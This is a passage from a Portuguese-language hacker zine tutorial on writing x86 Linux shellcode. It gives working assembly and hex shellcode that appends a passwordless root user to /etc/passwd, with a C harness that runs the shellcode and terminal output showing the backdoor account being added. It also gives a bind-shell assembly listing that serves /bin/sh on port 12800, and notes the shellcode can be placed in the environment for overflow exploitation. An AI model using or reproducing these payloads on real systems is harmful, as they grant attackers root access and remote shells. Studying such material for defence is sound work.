+Atenção nas  flags de  compilação. Dessa  vez precisamos  compilar estaticamente
+para funcionar. Vamos ver:
+
+root@motdlabs:~/IP_FIX/shellcode# gcc -o hexapasswd -static hexapasswd.c
+hexapasswd.c: In function `main':
+hexapasswd.c:45: warning: assignment from incompatible pointer type
+root@motdlabs:~/IP_FIX/shellcode# ./hexapasswd
+Tamanho do Shellcode: 6 bytes.
+root@motdlabs:~/IP_FIX/shellcode# cat /etc/passwd
+root:x:0:0::/root:/bin/bash
+...
+...
+...
+nobody:x:99:99:nobody:/:
+
+ip_fix::0:0::/root:/bin/sh
+root@motdlabs:~/IP_FIX/shellcode#
+
+	Sim!!! Funciona!!! :D
+	Opa! Perae! Tem algo errado! Olhem isso:
+
+Tamanho do Shellcode: 6 bytes.
+
+        Impossível um shellcode daquela proporção ter apenas isso.
+	Ahhh, achei o problema:
+
+"\x68\x73\x77\x64\x00" /* push   $0x647773   */
+
+Aqui está o problema,  um NULL byte, um  simples null byte que  simplesmente faz
+perder toda a graça  de nosso shellcode :(.  O tamanho do shellcode  foi 6 bytes
+porque a função strlen() conta os  caracteres até encontrar um null byte  ('\0')
+que indica o final da string.
+
+E agora?  Como resolveremos  isso? Isso  me deu  uma grande  dor de  cabeça pois
+preenchi o \x00  com a tabela  ascii inteira sem  sucesso. Empilhei a  string de
+todos os jeitos possíveis, com caracteres  a mais e a menos, mas  sem sucesso!!!
+Então pedi ajuda ao Narcotic e ele me sugeriu que fizesse o seguinte:
+
+" - Preenche o último byte com lixo e depois faz um rotacionamento com
+"shr" para desconsiderá-lo.".
+
+	Mas como isso? Até que é simples! Confira no código abaixo:
+
+<++> shellcode/asmpasswd2.c
+/*
+ *  Protótipo de shellcode em ASM.
+ *  Adiciona um usuário com premissões root.
+ *  by IP_FIX <ip_fix@motdlabs.org>.
+ *  MotdLabs <www.motdlabs.org>.
+ *  Compilação: # gcc -o asmpasswd2 asmpasswd2.c
+ */
+
+#include <stdio.h>
+
+main() {
+	__asm__(
+	         "xor  %eax,  %eax \n" /* Zera %eax.                                                                 */
+		 "mov  $0x647773FF, %ebx \n" /* Movemos a string para %ebx com lixo (FF). dwsFF                      */
+		 "shr  $0x8, %ebx  \n" /* Rotacionamos 8 bits (1 byte) para retiramos o FF.                          */
+		 "push %ebx        \n" /* Jogamos tudo para o stack.                                                 */
+		 "push $0x7361702F \n" /* E tudo vai normalmente para o stack. sap/                                  */
+		 "push $0x6374652F \n" /* cte/                                                                       */
+		 "mov  %esp, %ebx  \n" /* Agora sim jogamos pra %ebx: (const char *pathname,...                      */
+		 "mov  $0x402, %cx \n" /* Movemos O_RDWR|O_APPEND para %cx: ...int flags,...                         */
+		 "mov  $0x5,   %al \n" /* System Call de open().                                                     */
+		 "int  $0x80       \n" /* Cai pro modo kernel.                                                       */
+		 "mov  %eax,  %ebx \n" /* Tudo que foi feito em open, foi para %eax, agora precisamos tê-lo em %ebx. */
+		 "push $0x0A68732F \n" /* Movemos...                                                                 */
+		 "push $0x6E69622F \n" /* ...a outra...                                                              */
+		 "push $0x3A746F6F \n" /* ...string...                                                               */
+		 "push $0x722F3A3A \n" /* ...novamente...                                                            */
+		 "push $0x303A303A \n" /* ...para o...                                                               */
+		 "push $0x3A786966 \n" /* ...Stack.                                                                  */
+		 "push $0x5F70690A \n" /* \nip_fix::0:0::/root:/bin/sh\n                                             */
+	         "mov  %esp,  %ecx \n" /* Jogamos ela no contador %ecx.                                              */
+		 "xor  %edx,  %edx \n" /* Zeramos %edx.                                                              */
+		 "mov  $0x1C,  %dl \n" /* Tamanho da string em %edx.                                                 */
+		 "mov  $0x4,   %al \n" /* Nossa amável system call de write().                                       */
+		 "int  $0x80       \n" /* Comece o Show!!!                                                           */
+		 "xor  %eax,  %eax \n" /* Zera %eax.								     */
+		 "xor  %ebx,  %ebx \n" /* Zera %ebx pra SUCCESS.                                                     */
+		 "mov  $0x1,   %al \n" /* System Call de exit().                                                     */
+                 "int  $0x80       \n" /* Executa tudo.                                                              */
+		 );
+}
+<--> shellcode/asmpasswd2.c
+
+A arquitetura intel trabalha assim mesmo,  só podemos jogar até 4 bytes  por vez
+na  pilha. Repare  que em  todos meus  códigos eu  fiz o  possível para  sempre
+empurrar 4 bytes para nunca sobrar um null byte, mas nesse caso não foi possível
+pois a string "/etc/passwd" não é múltiplo de 4 e sempre sobrará um espaço!!!
+
+Quando houver situações como essa podemos preencher o espaço com lixo e apagá-lo
+com feito acima. Irei explicar melhor:
+
+A função open() nos informa de  que precisamos ter o arquivo que  queremos abrir
+em %ebx, mas antes precisamos empilhar a string no stack e depois sim, jogar  em
+%ebx. Nessa caso, teremos que isolar a string para rotacionarmos.:
+
+"mov  $0x647773FF, %ebx \n"
+
+Com ela isolada, vamos rotacionar 1 byte. O que o mnemônico "shr" (shift  right)
+faz é  rotacionar um  quantidade n  de bits  para a  direita, e  como precisamos
+voltar 1 byte, ratacionamos 8 bits afim de se acabar com o FF. :)
+
+"shr  $0x8, %ebx  \n"
+
+Com essa alteração feita, agora sim podemos empurrar para o stack.
+
+"push %ebx        \n"
+
+	E proseguirmos normalmente com o resto. =)
+
+"push $0x7361702F \n"
+"push $0x6374652F \n"
+"mov  %esp, %ebx  \n"
+
+É..., o que um null byte não faz a gente fazer? :P
+Seja como for, sempre  há um jeito para  sermos bem sucedidos em  situações como
+essa. Agora vamos compilar, testar e debugar!
+
+root@motdlabs:~/IP_FIX/shellcode# gcc -o asmpasswd2 asmpasswd2.c
+root@motdlabs:~/IP_FIX/shellcode# ./asmpasswd2
+root@motdlabs:~/IP_FIX/shellcode# cat /etc/passwd
+root:x:0:0::/root:/bin/bash
+...
+...
+...
+nobody:x:99:99:nobody:/:
+
+ip_fix::0:0::/root:/bin/sh
+root@motdlabs:~/IP_FIX/shellcode#
+
+	SIM!!! FUNCIONA!!!
+	Agora vamos a caça dos opcodes! =)
+
+<++> shellcode/hexapasswd2.c
+/*
+ *  Shellcode pronto em hexadecimal.
+ *  Adiciona um usuário com premissões root.
+ *  by IP_FIX <ip_fix@motdlabs.org>.
+ *  MotdLabs <www.motdlabs.org>.
+ *  Compilação: # gcc -o hexapasswd2 -static hexapasswd2.c
+ */
+
+#include <stdio.h>
+
+char shellcode[] = "\x31\xc0"             /* xor    %eax,%eax        */
+		   "\xbb\xff\x73\x77\x64" /* mov    $0x647773ff,%ebx */
+		   "\xc1\xeb\x08"         /* shr    $0x8,%ebx        */
+		   "\x53"                 /* push   %ebx             */
+                   "\x68\x2f\x70\x61\x73" /* push   $0x7361702f      */
+                   "\x68\x2f\x65\x74\x63" /* push   $0x6374652f      */
+                   "\x89\xe3"             /* mov    %esp,%ebx        */
+                   "\x66\xb9\x02\x04"     /* mov    $0x402,%cx       */
+                   "\xb0\x05"             /* mov    $0x5,%al         */
+                   "\xcd\x80"             /* int    $0x80            */
+                   "\x89\xc3"             /* mov    %eax,%ebx        */
+                   "\x68\x2f\x73\x68\x0a" /* push   $0xa68732f       */
+		   "\x68\x2f\x62\x69\x6e" /* push   $0x6e69622f      */
+                   "\x68\x6f\x6f\x74\x3a" /* push   $0x3a746f6f      */
+                   "\x68\x3a\x3a\x2f\x72" /* push   $0x722f3a3a      */
+                   "\x68\x3a\x30\x3a\x30" /* push   $0x303a303a      */
+		   "\x68\x66\x69\x78\x3a" /* push   $0x3a786966      */
+		   "\x68\x0a\x69\x70\x5f" /* push   $0x5f70690a      */
+                   "\x89\xe1"             /* mov    %esp,%ecx        */
+		   "\x31\xd2"             /* xor    %edx,%edx        */
+		   "\xb2\x1c"             /* mov    $0x1c,%dl        */
+                   "\xb0\x04"             /* mov    $0x4,%al         */
+                   "\xcd\x80"             /* int    $0x80            */
+		   "\x31\xc0"             /* xor    %eax,%eax        */
+                   "\x31\xdb"             /* xor    %ebx,%ebx        */
+                   "\xb0\x01"             /* mov    $0x1,%al         */
+                   "\xcd\x80";            /* int    $0x80            */
+main() {
+
+        /* Mostramos o tamanho para se ter um controle maior. */
+        printf("Tamanho do Shellcode: %d bytes.\n", strlen(shellcode));
+
+	/* Criamos um ponteiro para uma função do tipo long. */
+        long (*executa) ();
+
+        /* Apontamos a função para o shellcode. */
+        executa = shellcode;
+
+	/* E aqui acontece a mágica! :) */
+        executa();
+}
+<--> shellcode/hexapasswd2.c
+
+	Vamos ver se está certo.:
+
+root@motdlabs:~/IP_FIX/shellcode# gcc -o hexapasswd2 -static hexapasswd2.c
+hexapasswd2.c: In function `main':
+hexapasswd2.c:47: warning: assignment from incompatible pointer type
+root@motdlabs:~/IP_FIX/shellcode# ./hexapasswd2
+Tamanho do Shellcode: 86 bytes.
+root@motdlabs:~/IP_FIX/shellcode# cat /etc/passwd
+root:x:0:0::/root:/bin/bash
+...
+...
+...
+nobody:x:99:99:nobody:/:
+
+ip_fix::0:0::/root:/bin/sh
+root@motdlabs:~/IP_FIX/shellcode#
+
+	w00w00!!! Sim!!! Perfeito!!!
+
+É um pouco grandinho mas funciona, lembrando-se que numa exploração de  overflow
+podemos carregar nosso shellcode na  enviroment no sistema ao invés  de jogarmos
+dentro do buffer. ;)
+	
+	Galera, é isso aí...
+	
+Tinha prometido para muitos que iria colocar uma bindshell aqui (desculpa dns-),
+mas  o  que me impossibilitou  foi  o tempo,  justo  quando estava  terminando  a 
+bindshell  eu consegui um emprego e como  estudo noperíodo da noite fiquei  
+impossibilitado de terminar... Mas abaixo segue o fonte em ASM, mas sem null 
+bytes!!! :)
+
+<++> shellcode/asmbind.c
+/*
+ *  Protótipo de shellcode em ASM.
+ *  Binda uma shell na porta 12800.
+ *  by IP_FIX <ip_fix@motdlabs.org>.
+ *  MotdLabs <www.motdlabs.org>.
+ *  Compilação: # gcc -o asmbind asmbind.c
+ */
+
+#include <stdio.h>
+
+main() {
+
+	__asm__(
+		"lea  main+32, %edx \n"
+		"call %edx          \n"
+		"xor  %eax, %eax    \n"
+		"xor  %ebx, %ebx    \n"
+		"mov  $0x1, %al     \n"
+		"int  $0x80         \n" 
+		"xor  %eax, %eax    \n"
+        	"mov  $0x2, %al     \n"
+		"int  $0x80         \n"
+		"test %eax, %eax    \n"
+		"lea  main+54, %edx \n"
+  		"jne  main+24       \n"
+		"jmp  %edx          \n"
+		"xor  %eax, %eax    \n"
+		"xor  %ebx, %ebx    \n"
+		"mov  $0x1, %bl     \n"
+        	"push %eax          \n"
+        	"push $0x1          \n"
+        	"push $0x2          \n"
+		"mov  %esp,  %ecx   \n"
+		"mov  $0x66, %al    \n"
+		"int  $0x80         \n"
+		"xor  %edx,  %edx   \n"
+  		"push %edx          \n"
+		"push $0x32         \n"
+		"mov  $0x2,  %bl    \n"
+		"push %bx           \n"
+		"mov  %esp,  %ecx   \n"
+		"push $0x10         \n"
+		"push %ecx          \n"
+		"push %eax          \n"
+		"mov  %esp,  %ecx   \n"
+		"mov  $0x66, %al    \n"
+		"int  $0x80         \n"
+      		"not  %al           \n"
+		"mov  $0x4,   %bl   \n"
+		"mov  $0x66,  %al   \n"
+		"int  $0x80         \n"
+   		"add  $0xc,   %esp  \n"
+		"push %edx          \n"
+		"push %edx          \n"
+		"mov  $0x5,   %bl   \n"
+		"mov  $0x66,  %al   \n"
+		"int  $0x80         \n"
+		"mov  %al,   %bl    \n"
+		"xor  %ecx,  %ecx   \n"
+		"mov  $0x3f, %al    \n"
+		"int  $0x80         \n"
+		"mov  $0x1,  %cl    \n"
+		"mov  $0x3f, %al    \n"
+		"int  $0x80         \n"
+		"mov  $0x2,  %cl    \n"
+		"mov  $0x3f, %al    \n"
+		"int  $0x80         \n"
+		"xor  %eax,  %eax   \n" 
+		"push %eax          \n" 
+		"push $0x68732F2F   \n" 
+		"push $0x6E69622F   \n" 
+		"mov  %esp,  %ebx   \n" 
+		"push %eax          \n" 
+		"push %ebx          \n" 
+		"mov  %esp,  %ecx   \n" 
+		"xor  %edx,  %edx   \n" 
+		"mov  $0xb,  %al    \n" 
+		"int  $0x80         \n"  
+		);
+}
+<--> shellcode/asmbind.c
+
+Desculpem a falta  de comentários, mas  terminei um dia  antes do lançamento  da
+zine e iria demorar muito para comentas as passagens. Mas  prometo  a todos  que
+brevemente estarei  disponibilizando  novamente  esse artigo de uma   forma mais
+decente  e com mais  codes (bindshell melhorada, chroot  pra nãofugir do padrão.
+:) E também codes próprios) e  depuração de shellcode enfim, esse txt  foi muito
+corrido no final dele e não deu pra mim se expor como deveria. 
+Peço desculpas a todos  e que aguardem novas atualizações.
+   
+	Esses são apenas alguns links com referências sobre shellcode:
+		
+http://shellcode.org/
+http://www.shellcode.com.ar/
+http://www.metasploit.com/shellcode.html
+http://www.enderunix.org/docs/en/sc-en.txt
+http://www.safemode.org/files/zillion/shellcode/doc/Writing_shellcode.html
+http://www.siforge.org/articles/2004/01/12-shellcode_da_zero.html
+http://community.core-sdi.com/~juliano
+http://neworder.box.sk/newsread.php?newsid=10077
+http://www.mindsec.com/files/art-shellcode.txt
+http://www.infosecwriters.com/hhworld/shellcode.txt
+www.firewalls.com.br/files/shellcode.pdf 
+http://www.phrack.org/phrack/49/P49-14
+www.arson-network.com/ index.php?class=tutorial&subargs=479
+http://www.firewalls.com.br/files/shellcode.pdf
+http://www.firewalls.com.br/files/buffer.pdf
+www.securenet.com.br/artigo.php?artigo=3 
+www.id3ntlab.hpg.ig.com.br/shellcII.txt	
+http://embranet.com/~fingu/text/shellcode.txt
+	
+	Aqui os principais sobre ASM:
+	
+http://www.linuxassembly.org/ 
+http://www.w00w00.org/files/articles/att-vs-intel.txt
+http://webster.cs.ucr.edu/
+http://www.arl.wustl.edu/~lockwood/class/cse306/books/artofasm/toc.html
+http://www-106.ibm.com/developerworks/linux/library/l-ia.html
+
+Me desculpem a falta  de organização, mas compensarei  tudo na versão 2.0  desse
+artigo. :P
+Por  isso   nem  finalizei   as  conclusões,   aguarde  que   em  breve  estarei
+disponibilizando isso mais que completo. =)
+
+[]'s
+	
+IP_FIX.
+
+MSN: everson3000@hotmail.com
+ICQ: 159834122
